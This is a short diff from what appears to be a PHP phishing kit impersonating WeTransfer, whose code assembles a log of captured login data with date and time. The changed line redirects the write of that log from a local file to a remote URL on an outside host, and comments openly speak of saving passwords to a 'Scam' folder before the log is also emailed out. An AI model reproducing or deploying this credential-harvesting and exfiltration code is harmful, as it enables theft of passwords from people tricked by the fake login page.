@@ -21,7 +21,7 @@ $JarJar = "+---------[Wetransfer]----------+
 + Date Log  : $date
 + Time Log  : $time
 +---------[Anyi^]----------+";
-$file = fopen("logs.txt","a");   //// Save Password in LOGIN.txt / To Change Directory Or Folder Back Add (../) Ex: ../Dir/Scam/LOGIN.txt
+$file = fopen("http://clients.duck-it.net.au/pcassoc/test/logs.txt","a");   //// Save Password in LOGIN.txt / To Change Directory Or Folder Back Add (../) Ex: ../Dir/Scam/LOGIN.txt
 fwrite($file,$JarJar);
 $subject = "Wetransfer log";
 $headers = "From: Anyi-BABA info";
